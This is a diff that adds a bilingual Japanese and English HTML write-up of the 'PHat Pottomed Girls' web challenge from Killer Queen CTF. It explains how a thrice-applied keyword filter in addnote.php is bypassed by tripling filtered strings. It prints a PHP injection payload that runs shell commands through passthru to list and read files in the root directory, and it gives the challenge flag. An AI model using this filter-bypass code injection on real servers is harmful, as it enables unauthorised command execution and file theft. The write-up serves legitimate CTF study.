@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PHat Pottomed Girls (Killer Queen CTF) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>PHat Pottomed Girls</h1>
+<span class="language-selector-ja" lang="ja">
+<p>
+WebページのURLと、ファイル <code>addnote.php</code> が与えられた。<br>
+また、問題文より、flagはルートディレクトリにあるということだった。
+</p><p>
+<code>addnote.php</code> を読むと、PBjar CTF の <a href="../../../20210917_PBjar_CTF/web/ProgrammersHateProgramming_2/" class="language-aware-link">ProgrammersHateProgramming 2</a> と同様に <code>flag</code> や <code>cat</code> などの文字列を消す <code>filter</code> 関数があり、<br>
+入力データにこの <code>filter</code> 関数を3回適用した結果を <code>.php</code> で終わるファイル名のファイルに保存していた。
+</p><p>
+<code>filter</code> 関数を3回適用しているので、その分消してもらう文字列を3回挟むとよい。<br>
+以下の文字列を送信し、できたページにアクセスすることで、flagが得られた。
+</p>
+</span>
+<span class="language-selector-en" lang="en">
+<p>
+An URL of a web page and a file <code>addnote.php</code> were given.<br>
+Also, the challenge descryption said that the flag is in the root directory.
+</p><p>
+Reading <code>addnote.php</code>, I found a function <code>filter</code> that erases some strings including <code>flag</code> and <code>cat</code> like <a href="../../../20210917_PBjar_CTF/web/ProgrammersHateProgramming_2/" class="language-aware-link">ProgrammersHateProgramming 2</a> in PBjar CTF,<br>
+and that it is storing the input data to a file whose name ends with <code>.php</code> after applying this function <code>filter</code> 3 times.
+</p><p>
+Since the function <code>filter</code> is applied 3 times, putting strings to be deleted 3 times should work.<br>
+I obtained the flag by sending this string and accessing the created page.
+</p>
+</span>
+<code-block data-extension="php">
+&lt;flflflagagag? passthru("ls -al /"); passthru("ca" . "t /*");
+</code-block>
+
+<div class="flag">flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">Killer Queen CTF</a>
+</p>
+</body>
+</html>
